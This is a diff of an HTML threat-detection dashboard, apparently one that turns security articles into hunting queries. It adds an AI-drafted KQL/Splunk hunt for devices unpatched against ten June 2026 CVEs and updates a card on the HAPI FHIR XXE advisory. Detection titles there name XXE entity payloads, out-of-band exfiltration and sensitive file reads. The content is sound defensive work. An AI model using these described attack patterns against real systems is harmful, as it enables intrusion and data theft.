@@ -2584,14 +2584,14 @@ DeviceFileEvents
 </details></div>
 </article>
 <article class="card" id="art-05" data-art-slug="2026-06-17-beyond-the-benchmark-advancing-security-at-ai-speed"
-  data-phases="c2,delivery,exploit,install,recon" data-sev="crit"
+  data-phases="c2,delivery,exploit,install,recon,weapon" data-sev="crit"
   data-techs="T1190"
   data-sources="Microsoft Security Blog"
   data-platforms="def,sent,spl"
-  data-splunk-cats="application,endpoint"
+  data-splunk-cats="application,cloud,endpoint"
   data-targets="windows"
-  data-uc-count="2" data-llm-uc-count="0"
-  data-search="Beyond the benchmark: Advancing security at AI speed Read how Microsoft Security has advanced its agentic vulnerability detection system, codename MDASH, integrating into real-world workflows across Windows, Azure, and identity systems. The post Beyond the benchmark: Advancing security at AI speed appeared first on Microsoft Security Blog . CVE-2026-45607 CVE-2026-45641 CVE-2026-47652 CVE-2026-41108 CVE-2026-45608 CVE-2026-45634 CVE-2026-45648 CVE-2026-47289 CVE-2026-45657 CVE-2026-47291 T1190 Asset exposure — vulnerability matches article CVE(s) Article-specific behavioural hunt — Beyond the benchmark: Advancing security at AI speed">
+  data-uc-count="3" data-llm-uc-count="1"
+  data-search="Beyond the benchmark: Advancing security at AI speed Read how Microsoft Security has advanced its agentic vulnerability detection system, codename MDASH, integrating into real-world workflows across Windows, Azure, and identity systems. The post Beyond the benchmark: Advancing security at AI speed appeared first on Microsoft Security Blog . CVE-2026-45607 CVE-2026-45641 CVE-2026-47652 CVE-2026-41108 CVE-2026-45608 CVE-2026-45634 CVE-2026-45648 CVE-2026-47289 CVE-2026-45657 CVE-2026-47291 T1190 [LLM] Patch Tuesday June 2026 (MDASH-discovered) — unpatched asset exposure to 10 disclosed CVEs Asset exposure — vulnerability matches article CVE(s) Article-specific behavioural hunt — Beyond the benchmark: Advancing security at AI speed">
   <div class="sev-ribbon crit">Critical</div>
   <button class="share-btn card-share" data-share-art="2026-06-17-beyond-the-benchmark-advancing-security-at-ai-speed" title="Copy share link to this article" aria-label="Copy share link">
     <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
@@ -2600,9 +2600,9 @@ DeviceFileEvents
   <div class="source-badges"><span class="source-badge ms">Microsoft Security Blog</span></div>
   <div class="pubmeta">
     <span>2026-06-17</span>
-    <span>2 use cases</span>
+    <span>3 use cases</span>
     <span>1 technique</span>
-    <span>3 kill-chain phases detected</span>
+    <span>4 kill-chain phases detected</span>
   </div>
   <p class="summary">Read how Microsoft Security has advanced its agentic vulnerability detection system, codename MDASH, integrating into real-world workflows across Windows, Azure, and identity systems. The post Beyond the benchmark: Advancing security at AI speed appeared first on Microsoft Security Blog .</p>
   <div class="ind-group"><span class="ind-label">CVEs</span><span class="ind cve">CVE-2026-45607</span> <span class="ind cve">CVE-2026-45641</span> <span class="ind cve">CVE-2026-47652</span> <span class="ind cve">CVE-2026-41108</span> <span class="ind cve">CVE-2026-45608</span> <span class="ind cve">CVE-2026-45634</span> <span class="ind cve">CVE-2026-45648</span> <span class="ind cve">CVE-2026-47289</span> <span class="ind cve">CVE-2026-45657</span> <span class="ind cve">CVE-2026-47291</span></div>
@@ -2618,10 +2618,10 @@ DeviceFileEvents
   <div class="name">Reconnaissance</div>
   <div class="marker">Detected</div>
 </div>
-<div class="kc-cell ">
+<div class="kc-cell hit">
   <div class="num">Phase 2</div>
   <div class="name">Weaponization</div>
-  <div class="marker">—</div>
+  <div class="marker">Detected</div>
 </div>
 <div class="kc-cell hit">
   <div class="num">Phase 3</div>
@@ -2649,14 +2649,72 @@ DeviceFileEvents
   <div class="marker">—</div>
 </div></div>
   <div class="kc-detail"><div class="phase-line hit"><strong>Reconnaissance.</strong> Attacker researches the target — OSINT, scanning, enumeration. <em>→ Asset exposure — vulnerability matches article CVE(s)</em></div>
-<div class="phase-line "><strong>Weaponization.</strong> Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).</div>
+<div class="phase-line hit"><strong>Weaponization.</strong> Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer). <em>→ [LLM] Patch Tuesday June 2026 (MDASH-discovered) — unpatched asset exposure to 10 disclosed CVEs</em></div>
 <div class="phase-line hit"><strong>Delivery.</strong> Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).</div>
 <div class="phase-line hit"><strong>Exploitation.</strong> Triggering the exploit — vulnerability/macro/trust abuse to execute code. <em>→ Article-specific behavioural hunt — Beyond the benchmark: Advancing security at AI speed</em></div>
 <div class="phase-line inferred"><strong>Installation.</strong> Establishing persistence on the host — backdoor, service, scheduled task, registry key.</div>
 <div class="phase-line inferred"><strong>Command &amp; Control.</strong> Beacon to attacker infrastructure for control and tasking.</div>
 <div class="phase-line "><strong>Actions on Objectives.</strong> Lateral movement, credential dumping, data theft, ransomware, sabotage.</div></div>
 </div>
-  <div class="usecases"><details class="uc" data-uc-slug="222a505c20" data-platforms="def,sent,spl" data-targets="" open>
+  <div class="usecases"><details class="uc" data-uc-slug="9c0d46129a" data-platforms="def,sent,spl" data-targets="" open>
+  <summary>
+    <span class="uc-title">Patch Tuesday June 2026 (MDASH-discovered) — unpatched asset exposure to 10 disclosed CVEs</span>
+    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Weaponization</span>
+    <span class="uc-conf high">High</span>
+    <button class="share-btn" data-share-uc="9c0d46129a" title="Copy share link to this UC" aria-label="Copy share link">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+    </button>
+  </summary>
+  <div class="uc-body">
+    <div class="uc-desc">Hunting query that surfaces devices still vulnerable to the ten CVEs Microsoft credited to its MDASH agentic scanning system in the June 2026 cohort, spanning Hyper-V RCE, Windows Kernel UAF, HTTP.sys integer overflow, AD DS stack overflow, Remote Desktop Client heap overflow, DNS Client EoP, and DHCP Client info-disclosure. Use this to prioritise patching before exploit code is published — the article itself is a public IOC of which components attackers will now reverse-engineer.
+
+Rationale: Uses the exact ten CVE IDs published in the article&#x27;s Patch Tuesday cohort table (CVE-2026-45607, -45641, -47652, -41108, -45608, -45634, -45648, -47289, -45657, -47291). The article itself functions as a vulnerability advisory — it names the affected components (Hyper-V, Windows Kernel, HTTP.sys, AD DS, RDP Client, DNS Client, DHCP Client) but provides zero exploitation indicators, so a TVM-posture hunt is the only honest article-grounded detection. Cross-checked the CVE list against the MSRC June 2026 Patch Tuesday release notes.
+
+Cross-checked against:
+  • https://msrc.microsoft.com/update-guide/
+  • https://www.microsoft.com/en-us/security/blog/2026/06/17/beyond-the-benchmark-advancing-security-at-ai-speed/</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploitation for Client Execution">T1203</span> <span class="ind tech" title="Exploitation of Remote Services">T1210</span> <span class="ind tech" title="Exploitation for Privilege Escalation">T1068</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Vulnerabilities</span></div>
+    <details class="uc-fp"><summary>Expected false positives · estimated rate: low<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Devices that legitimately cannot patch quickly (clinical/OT/legacy lines) — appear vulnerable forever until allow-listed</li><li>Recently-imaged hosts where Defender TVM hasn&#x27;t completed first scan yet (CveId appears, then drops after re-inventory)</li><li>Hyper-V hosts running pre-release builds where the RecommendedSecurityUpdate KB doesn&#x27;t apply</li><li>Air-gapped servers genuinely unreachable by WSUS — show as vulnerable in TVM but cannot be patched via the normal channel</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where DeviceId !in ((DeviceInfo | where MachineGroup has_any (&quot;OT&quot;,&quot;Clinical&quot;,&quot;Legacy-Exclusion&quot;) | distinct DeviceId))</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: pivot from the CveId hits into DeviceInfo and join to IsInternetFacing — exposure on edge hosts (HTTP.sys CVE-2026-47291, AD DS CVE-2026-45648) is a P1; pure internal-LAN exposure for the DHCP/DNS client CVEs is P2. Check IsExploitAvailable from the KB join. 2) Contain: stage emergency patching via the KB returned in RecommendedSecurityUpdate; for Hyper-V hosts, evacuate guests off unpatched hypervisors before reboot; for AD DS RCE (CVE-2026-45648, CVSS 8.8), restrict LDAP/Kerberos egress from untrusted networks at the firewall pending patch. 3) Hunt: once patched, hunt the same period in DeviceTvmSoftwareVulnerabilitiesKB for any of these CVEs flipping IsExploitAvailable=true, and pivot DeviceProcessEvents on Hyper-V worker / dns.exe / dhcpcore.dll crashes that may indicate exploitation attempts pre-patch.</div></details>
+    <div class="tabs">
+      <button class="tab-btn active" data-target="art-05-uc0-kql">Defender KQL</button>
+      <button class="tab-btn" data-target="art-05-uc0-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-05-uc0-spl">Splunk SPL (CIM)</button>
+    </div>
+    <div class="tab-content active" id="art-05-uc0-kql"><pre><button class="copy-btn">COPY</button><code>let MdashCves = dynamic([&quot;CVE-2026-45607&quot;,&quot;CVE-2026-45641&quot;,&quot;CVE-2026-47652&quot;,&quot;CVE-2026-41108&quot;,&quot;CVE-2026-45608&quot;,&quot;CVE-2026-45634&quot;,&quot;CVE-2026-45648&quot;,&quot;CVE-2026-47289&quot;,&quot;CVE-2026-45657&quot;,&quot;CVE-2026-47291&quot;]);
+DeviceTvmSoftwareVulnerabilities
+| where Timestamp &gt; ago(7d)
+| where CveId in (MdashCves)
+| join kind=leftouter (DeviceTvmSoftwareVulnerabilitiesKB | summarize arg_max(LastModifiedTime, CvssScore, IsExploitAvailable) by CveId) on CveId
+| summarize DeviceCount = dcount(DeviceId),
+            Devices = make_set(DeviceName, 25),
+            InternetFacingHosts = dcountif(DeviceId, DeviceId in ((DeviceInfo | where IsInternetFacing == true | distinct DeviceId)))
+            by CveId, SoftwareName, RecommendedSecurityUpdate, VulnerabilitySeverityLevel, CvssScore, IsExploitAvailable
+| order by IsExploitAvailable desc, CvssScore desc, DeviceCount desc</code></pre></div>
+    <div class="tab-content" id="art-05-uc0-sentinel"><pre><button class="copy-btn">COPY</button><code>let MdashCves = dynamic([&quot;CVE-2026-45607&quot;,&quot;CVE-2026-45641&quot;,&quot;CVE-2026-47652&quot;,&quot;CVE-2026-41108&quot;,&quot;CVE-2026-45608&quot;,&quot;CVE-2026-45634&quot;,&quot;CVE-2026-45648&quot;,&quot;CVE-2026-47289&quot;,&quot;CVE-2026-45657&quot;,&quot;CVE-2026-47291&quot;]);
+DeviceTvmSoftwareVulnerabilities
+| where TimeGenerated &gt; ago(7d)
+| where CveId in (MdashCves)
+| summarize DeviceCount = dcount(DeviceId),
+            Devices = make_set(DeviceName, 25),
+            FirstSeen = min(TimeGenerated),
+            LastSeen = max(TimeGenerated)
+            by CveId, SoftwareName, SoftwareVersion, RecommendedSecurityUpdate, VulnerabilitySeverityLevel
+| join kind=leftouter (
+    Update
+    | where TimeGenerated &gt; ago(7d)
+    | where Title has_any (&quot;Hyper-V&quot;,&quot;DNS Client&quot;,&quot;DHCP Client&quot;,&quot;Active Directory Domain Services&quot;,&quot;Remote Desktop Client&quot;,&quot;Windows Kernel&quot;,&quot;HTTP.sys&quot;)
+    | summarize PatchedHosts = dcount(Computer) by KBID
+) on $left.RecommendedSecurityUpdate == $right.KBID
+| order by VulnerabilitySeverityLevel asc, DeviceCount desc</code></pre></div>
+    <div class="tab-content" id="art-05-uc0-spl"><span class="splunk-cat-pill splunk-cat-cloud" title="Splunk-research detection category">CLOUD</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-05-uc0-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-05-uc0-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-05-uc0-spl-acc"><button class="copy-btn">COPY</button><code>| tstats summariesonly=true count min(_time) as first_seen max(_time) as last_seen from datamodel=Vulnerabilities where Vulnerabilities.cve IN (&quot;CVE-2026-45607&quot;,&quot;CVE-2026-45641&quot;,&quot;CVE-2026-47652&quot;,&quot;CVE-2026-41108&quot;,&quot;CVE-2026-45608&quot;,&quot;CVE-2026-45634&quot;,&quot;CVE-2026-45648&quot;,&quot;CVE-2026-47289&quot;,&quot;CVE-2026-45657&quot;,&quot;CVE-2026-47291&quot;) by Vulnerabilities.dest Vulnerabilities.cve Vulnerabilities.severity Vulnerabilities.signature
+| `drop_dm_object_name(Vulnerabilities)`
+| sort - severity, dest</code></pre><pre class="spl-mode-body" id="art-05-uc0-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as first_seen max(_time) as last_seen from datamodel=Vulnerabilities where Vulnerabilities.cve IN (&quot;CVE-2026-45607&quot;,&quot;CVE-2026-45641&quot;,&quot;CVE-2026-47652&quot;,&quot;CVE-2026-41108&quot;,&quot;CVE-2026-45608&quot;,&quot;CVE-2026-45634&quot;,&quot;CVE-2026-45648&quot;,&quot;CVE-2026-47289&quot;,&quot;CVE-2026-45657&quot;,&quot;CVE-2026-47291&quot;) by Vulnerabilities.dest Vulnerabilities.cve Vulnerabilities.severity Vulnerabilities.signature
+| `drop_dm_object_name(Vulnerabilities)`
+| sort - severity, dest</code></pre></div></div>
+  </div>
+</details>
+<details class="uc" data-uc-slug="222a505c20" data-platforms="def,sent,spl" data-targets="">
   <summary>
     <span class="uc-title">Asset exposure — vulnerability matches article CVE(s)</span>
     <span class="uc-phase">Reconnaissance</span>
@@ -2671,11 +2729,11 @@ DeviceFileEvents
     <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Vulnerabilities</span> <span class="ind">DeviceInfo</span> <span class="ind">DeviceTvmSoftwareVulnerabilities</span></div>
     
     <div class="tabs">
-      <button class="tab-btn active" data-target="art-05-uc0-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-05-uc0-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-05-uc0-spl">Splunk SPL (CIM)</button>
+      <button class="tab-btn active" data-target="art-05-uc1-kql">Defender KQL</button>
+      <button class="tab-btn" data-target="art-05-uc1-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-05-uc1-spl">Splunk SPL (CIM)</button>
     </div>
-    <div class="tab-content active" id="art-05-uc0-kql"><pre><button class="copy-btn">COPY</button><code>// TVM tables are daily snapshots — pin a 1-day window so the engine
+    <div class="tab-content active" id="art-05-uc1-kql"><pre><button class="copy-btn">COPY</button><code>// TVM tables are daily snapshots — pin a 1-day window so the engine
 // partitions on Timestamp instead of scanning the full retention.
 DeviceTvmSoftwareVulnerabilities
 | where Timestamp &gt; ago(1d)
@@ -2684,7 +2742,7 @@ DeviceTvmSoftwareVulnerabilities
 | project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
 | order by VulnerabilitySeverityLevel asc, DeviceName asc
 </code></pre></div>
-    <div class="tab-content" id="art-05-uc0-sentinel"><pre><button class="copy-btn">COPY</button><code>// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
+    <div class="tab-content" id="art-05-uc1-sentinel"><pre><button class="copy-btn">COPY</button><code>// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
 // `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
 // no Sentinel translation — track via Update / Heartbeat OS-version
 // gaps as a coarse approximation.
@@ -2696,12 +2754,12 @@ DeviceTvmSoftwareVulnerabilities
           VulnerabilitySeverityLevel, RecommendedSecurityUpdate
 | order by VulnerabilitySeverityLevel asc, DeviceName asc
 </code></pre></div>
-    <div class="tab-content" id="art-05-uc0-spl"><span class="splunk-cat-pill splunk-cat-application" title="Splunk-research detection category">APPLICATION</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-05-uc0-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-05-uc0-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-05-uc0-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
+    <div class="tab-content" id="art-05-uc1-spl"><span class="splunk-cat-pill splunk-cat-application" title="Splunk-research detection category">APPLICATION</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-05-uc1-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-05-uc1-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-05-uc1-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
     from datamodel=Vulnerabilities
     where Vulnerabilities.signature IN (&quot;CVE-2026-45607&quot;, &quot;CVE-2026-45641&quot;, &quot;CVE-2026-47652&quot;, &quot;CVE-2026-41108&quot;, &quot;CVE-2026-45608&quot;, &quot;CVE-2026-45634&quot;, &quot;CVE-2026-45648&quot;, &quot;CVE-2026-47289&quot;, &quot;CVE-2026-45657&quot;, &quot;CVE-2026-47291&quot;)
     by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
 | `drop_dm_object_name(Vulnerabilities)`
-| sort - severity</code></pre><pre class="spl-mode-body" id="art-05-uc0-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
+| sort - severity</code></pre><pre class="spl-mode-body" id="art-05-uc1-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
     from datamodel=Vulnerabilities
     where Vulnerabilities.signature IN (&quot;CVE-2026-45607&quot;, &quot;CVE-2026-45641&quot;, &quot;CVE-2026-47652&quot;, &quot;CVE-2026-41108&quot;, &quot;CVE-2026-45608&quot;, &quot;CVE-2026-45634&quot;, &quot;CVE-2026-45648&quot;, &quot;CVE-2026-47289&quot;, &quot;CVE-2026-45657&quot;, &quot;CVE-2026-47291&quot;)
     by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
@@ -2724,11 +2782,11 @@ DeviceTvmSoftwareVulnerabilities
     <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Processes</span> <span class="ind">Endpoint.Filesystem</span> <span class="ind">Endpoint.Registry</span></div>
     
     <div class="tabs">
-      <button class="tab-btn active" data-target="art-05-uc1-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-05-uc1-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-05-uc1-spl">Splunk SPL (CIM)</button>
+      <button class="tab-btn active" data-target="art-05-uc2-kql">Defender KQL</button>
+      <button class="tab-btn" data-target="art-05-uc2-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-05-uc2-spl">Splunk SPL (CIM)</button>
     </div>
-    <div class="tab-content active" id="art-05-uc1-kql"><pre><button class="copy-btn">COPY</button><code>// Article-specific bespoke detection — Beyond the benchmark: Advancing security at AI speed
+    <div class="tab-content active" id="art-05-uc2-kql"><pre><button class="copy-btn">COPY</button><code>// Article-specific bespoke detection — Beyond the benchmark: Advancing security at AI speed
 // Hunts the actual binaries / paths / commandline fragments named
 // in the article instead of a generic technique-class template.
 DeviceProcessEvents
@@ -2748,7 +2806,7 @@ DeviceFileEvents
           FileName, ActionType, InitiatingProcessFileName,
           InitiatingProcessCommandLine
 | order by Timestamp desc</code></pre></div>
-    <div class="tab-content" id="art-05-uc1-sentinel"><pre><button class="copy-btn">COPY</button><code>// Microsoft Sentinel — auto-derived from the Defender XDR hunt.
+    <div class="tab-content" id="art-05-uc2-sentinel"><pre><button class="copy-btn">COPY</button><code>// Microsoft Sentinel — auto-derived from the Defender XDR hunt.
 // Requires the Microsoft 365 Defender data connector (streams the
 // advanced-hunting tables into Sentinel; Timestamp → TimeGenerated).
 // Article-specific bespoke detection — Beyond the benchmark: Advancing security at AI speed
@@ -2771,7 +2829,7 @@ DeviceFileEvents
           FileName, ActionType, InitiatingProcessFileName,
           InitiatingProcessCommandLine
 | order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-05-uc1-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-05-uc1-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-05-uc1-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-05-uc1-spl-acc"><button class="copy-btn">COPY</button><code>``` Article-specific bespoke detection — Beyond the benchmark: Advancing security at AI speed ```
+    <div class="tab-content" id="art-05-uc2-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-05-uc2-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-05-uc2-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-05-uc2-spl-acc"><button class="copy-btn">COPY</button><code>``` Article-specific bespoke detection — Beyond the benchmark: Advancing security at AI speed ```
 | tstats `summariesonly` count earliest(_time) AS firstTime latest(_time) AS lastTime
     from datamodel=Endpoint.Processes
     where (Processes.process_name IN (&quot;http.sys&quot;))
@@ -2787,7 +2845,7 @@ DeviceFileEvents
     by Filesystem.dest, Filesystem.user, Filesystem.process_name,
        Filesystem.file_path, Filesystem.file_name
 | `drop_dm_object_name(Filesystem)`
-]</code></pre><pre class="spl-mode-body" id="art-05-uc1-spl-raw"><button class="copy-btn">COPY</button><code>``` Article-specific bespoke detection — Beyond the benchmark: Advancing security at AI speed ```
+]</code></pre><pre class="spl-mode-body" id="art-05-uc2-spl-raw"><button class="copy-btn">COPY</button><code>``` Article-specific bespoke detection — Beyond the benchmark: Advancing security at AI speed ```
 | tstats summariesonly=false count earliest(_time) AS firstTime latest(_time) AS lastTime
     from datamodel=Endpoint.Processes
     where (Processes.process_name IN (&quot;http.sys&quot;))
@@ -2808,14 +2866,14 @@ DeviceFileEvents
 </details></div>
 </article>
 <article class="card" id="art-07" data-art-slug="2026-06-17-ghsa-critical-cve-2026-55471-hapi-fhir-xxe-in-xsltutilities-"
-  data-phases="actions,c2,exploit,install,recon" data-sev="crit"
+  data-phases="actions,c2,exploit,install,recon,weapon" data-sev="crit"
   data-techs="T1190"
   data-sources="GitHub Security Advisories"
-  data-platforms="cloudwatch,datadog,def,falcon,sent,sigma,spl"
-  data-splunk-cats="application,endpoint,network,web"
-  data-targets="linux,vcs,windows"
-  data-uc-count="7" data-llm-uc-count="4"
-  data-search="[GHSA / CRITICAL] CVE-2026-55471: HAPI FHIR: XXE in XsltUtilities.saxonTransform via unhardened Saxon TransformerFactory HAPI FHIR: XXE in XsltUtilities.saxonTransform via unhardened Saxon TransformerFactory CVE-2026-55471 T1190 [LLM] XXE DOCTYPE/ENTITY payload posted to HAPI FHIR endpoint (CVE-2026-55471) [LLM] Java/FHIR process reads sensitive local files after inbound XML POST (XXE file disclosure) [LLM] FHIR Java process beacons to first-seen external host (XXE OOB / parameter-entity exfil) [LLM] XSLT/XML parser error burst on HAPI FHIR (saxonTransform XXE probing) Beaconing — periodic outbound to small set of destinations Asset exposure — vulnerability matches article CVE(s) Article-specific behavioural hunt — [GHSA / CRITICAL] CVE-2026-55471: HAPI FHIR: XXE in XsltUtilities.saxonTransform">
+  data-platforms="datadog,def,falcon,sent,sigma,spl"
+  data-splunk-cats="application,cloud,endpoint,network"
+  data-targets="linux,vcs,web-app,windows"
+  data-uc-count="8" data-llm-uc-count="5"
+  data-search="[GHSA / CRITICAL] CVE-2026-55471: HAPI FHIR: XXE in XsltUtilities.saxonTransform via unhardened Saxon TransformerFactory HAPI FHIR: XXE in XsltUtilities.saxonTransform via unhardened Saxon TransformerFactory CVE-2026-55471 T1190 [LLM] HAPI FHIR org.hl7.fhir.utilities &lt;= 6.9.8 vulnerable to CVE-2026-55471 XXE (asset inventory) [LLM] XXE DOCTYPE/ENTITY payload in HTTP POST to HAPI FHIR endpoint [LLM] JVM process outbound to non-allow-listed external host (XXE OOB exfil callback) [LLM] XXE parameter-entity (`&lt;!ENTITY %`) payload in HTTP body to HAPI FHIR endpoint [LLM] JVM DNS lookup for fresh external domain within 10s of inbound FHIR POST Beaconing — periodic outbound to small set of destinations Asset exposure — vulnerability matches article CVE(s) Article-specific behavioural hunt — [GHSA / CRITICAL] CVE-2026-55471: HAPI FHIR: XXE in XsltUtilities.saxonTransform">
   <div class="sev-ribbon crit">Critical</div>
   <button class="share-btn card-share" data-share-art="2026-06-17-ghsa-critical-cve-2026-55471-hapi-fhir-xxe-in-xsltutilities-" title="Copy share link to this article" aria-label="Copy share link">
     <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
@@ -2824,9 +2882,9 @@ DeviceFileEvents
   <div class="source-badges"><span class="source-badge ">GitHub Security Advisories</span></div>
   <div class="pubmeta">
     <span>2026-06-17</span>
-    <span>7 use cases</span>
+    <span>8 use cases</span>
     <span>1 technique</span>
-    <span>5 kill-chain phases detected</span>
+    <span>6 kill-chain phases detected</span>
   </div>
   <p class="summary">HAPI FHIR: XXE in XsltUtilities.saxonTransform via unhardened Saxon TransformerFactory</p>
   <div class="ind-group"><span class="ind-label">CVEs</span><span class="ind cve">CVE-2026-55471</span></div>
@@ -2842,10 +2900,10 @@ DeviceFileEvents
   <div class="name">Reconnaissance</div>
   <div class="marker">Detected</div>
 </div>
-<div class="kc-cell ">
+<div class="kc-cell hit">
   <div class="num">Phase 2</div>
   <div class="name">Weaponization</div>
-  <div class="marker">—</div>
+  <div class="marker">Detected</div>
 </div>
 <div class="kc-cell ">
   <div class="num">Phase 3</div>
@@ -2872,352 +2930,394 @@ DeviceFileEvents
   <div class="name">Actions on Objectives</div>
   <div class="marker">Detected</div>
 </div></div>
-  <div class="kc-detail"><div class="phase-line hit"><strong>Reconnaissance.</strong> Attacker researches the target — OSINT, scanning, enumeration. <em>→ [LLM] XSLT/XML parser error burst on HAPI FHIR (saxonTransform XXE probing) · Asset exposure — vulnerability matches article CVE(s)</em></div>
-<div class="phase-line "><strong>Weaponization.</strong> Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).</div>
+  <div class="kc-detail"><div class="phase-line hit"><strong>Reconnaissance.</strong> Attacker researches the target — OSINT, scanning, enumeration. <em>→ Asset exposure — vulnerability matches article CVE(s)</em></div>
+<div class="phase-line hit"><strong>Weaponization.</strong> Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer). <em>→ [LLM] HAPI FHIR org.hl7.fhir.utilities &lt;= 6.9.8 vulnerable to CVE-2026-55471 XXE (asset inventory)</em></div>
 <div class="phase-line "><strong>Delivery.</strong> Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).</div>
-<div class="phase-line hit"><strong>Exploitation.</strong> Triggering the exploit — vulnerability/macro/trust abuse to execute code. <em>→ [LLM] XXE DOCTYPE/ENTITY payload posted to HAPI FHIR endpoint (CVE-2026-55471)</em></div>
+<div class="phase-line hit"><strong>Exploitation.</strong> Triggering the exploit — vulnerability/macro/trust abuse to execute code. <em>→ [LLM] XXE DOCTYPE/ENTITY payload in HTTP POST to HAPI FHIR endpoint · [LLM] XXE parameter-entity (`&lt;!ENTITY %`) payload in HTTP body to HAPI FHIR endpoint</em></div>
 <div class="phase-line hit"><strong>Installation.</strong> Establishing persistence on the host — backdoor, service, scheduled task, registry key. <em>→ Article-specific behavioural hunt — [GHSA / CRITICAL] CVE-2026-55471: HAPI FHIR: XXE in XsltUtilities.saxonTransform</em></div>
-<div class="phase-line hit"><strong>Command &amp; Control.</strong> Beacon to attacker infrastructure for control and tasking. <em>→ [LLM] FHIR Java process beacons to first-seen external host (XXE OOB / parameter-entity exfil) · Beaconing — periodic outbound to small set of destinations</em></div>
-<div class="phase-line hit"><strong>Actions on Objectives.</strong> Lateral movement, credential dumping, data theft, ransomware, sabotage. <em>→ [LLM] Java/FHIR process reads sensitive local files after inbound XML POST (XXE file disclosure)</em></div></div>
